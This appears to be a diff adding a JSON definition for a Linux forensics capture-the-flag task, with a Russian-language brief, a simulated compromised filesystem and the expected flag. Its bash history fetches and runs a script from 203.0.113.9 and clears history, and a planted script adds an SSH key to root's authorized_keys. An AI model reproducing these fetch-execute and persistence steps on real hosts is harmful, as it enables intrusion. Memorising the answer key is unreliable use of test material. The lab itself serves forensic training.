@@ -1,0 +1,43 @@
+{
+ "id": "forensics-win-misc",
+ "workdir": "/home/student/task",
+ "hostname": "lab",
+ "expect": {
+  "file": "/home/student/task/answer.txt",
+  "contains": "nto{l1nux_4rt1f4cts_4nd_4nt1_f0r3ns1cs}"
+ },
+ "fs": [
+  {
+   "path": "/home/student/task",
+   "type": "dir"
+  },
+  {
+   "path": "/home/student/task/task.md",
+   "text": "# Задача: Linux-артефакты и анти-форензика\n\nХост Linux после вторжения. Злоумышленник пытался замести следы (чистил историю,\nподделывал время), но оставил закладку. Найди её.\n\n1. История команд: `cat home/analyst/.bash_history`.\n2. Журнал входов: `cat var/log/auth.log`.\n3. Скрытые файлы: `ls -la tmp`.\n4. Прочитай закладку: `cat tmp/.hidden_backdoor.sh`.\n5. Метка: `grep nto tmp/.hidden_backdoor.sh > answer.txt`.\n"
+  },
+  {
+   "path": "/home/student/task/home/analyst/.bash_history",
+   "text": "sudo -i\nwget http://203.0.113.9/stage2.sh -O /tmp/.hidden_backdoor.sh\nchmod +x /tmp/.hidden_backdoor.sh\n/tmp/.hidden_backdoor.sh\nhistory -c\n"
+  },
+  {
+   "path": "/home/student/task/var/log/auth.log",
+   "text": "Oct  9 22:05:11 host sshd[3120]: Accepted password for analyst from 203.0.113.9 port 49721\nOct  9 22:05:40 host sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/bash\n\n--- журнал обрывается: строки 22:06-22:19 отсутствуют (очищены) ---\n\nOct  9 22:19:04 host sshd[3188]: Accepted password for analyst from 10.0.0.10 port 51022\n"
+  },
+  {
+   "path": "/home/student/task/tmp/.hidden_backdoor.sh",
+   "text": "#!/bin/sh\n# persistence backdoor\necho 'ssh-rsa AAAAB3Nza...backdoor' >> /root/.ssh/authorized_keys\n# flag: nto{l1nux_4rt1f4cts_4nd_4nt1_f0r3ns1cs}\n"
+  }
+ ],
+ "tools": {
+  "stat": {
+   "help": "stat <файл> — метаданные файла (время создания/изменения)",
+   "cases": [
+    {
+     "match": "backdoor",
+     "example": "tmp/.hidden_backdoor.sh",
+     "output": "  File: tmp/.hidden_backdoor.sh\n  Size: 168         Blocks: 8\nModify: 2021-01-01 00:00:00.000000000 +0000   <- timestomped (совпадает с датой релиза)\nChange: 2024-10-09 22:19:04.512000000 +0000\n Birth: 2024-10-09 22:19:04.512000000 +0000\n"
+    }
+   ]
+  }
+ }
+}
